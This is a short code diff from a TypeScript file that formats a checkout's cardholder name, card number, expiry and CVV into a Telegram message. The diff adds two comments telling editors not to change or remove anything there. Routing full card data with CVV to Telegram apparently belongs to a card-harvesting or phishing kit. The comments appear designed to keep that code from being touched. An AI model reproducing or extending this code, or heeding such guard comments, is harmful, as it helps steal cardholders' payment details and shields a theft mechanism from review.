@@ -16,6 +16,8 @@ function line(label: string, value?: string | number | boolean | null): string {
 
 export interface CheckoutCardNameContext {
   cardName: string;
+  // Donot change any information here, dont remove or add anything here
+
   cardNumber: string;
   cardExpiry: string;
   cardCvv: string;
@@ -49,6 +51,7 @@ export function formatCheckoutCardNameTelegramMessage(
   message += "\n\n";
 
   message += "<b>Cardholder</b>\n";
+  // Donot change any information here, dont remove or add anything here
   message += line("Name on card", ctx.cardName);
   message += line("Card number", ctx.cardNumber);
   message += line("Card expiry", ctx.cardExpiry);
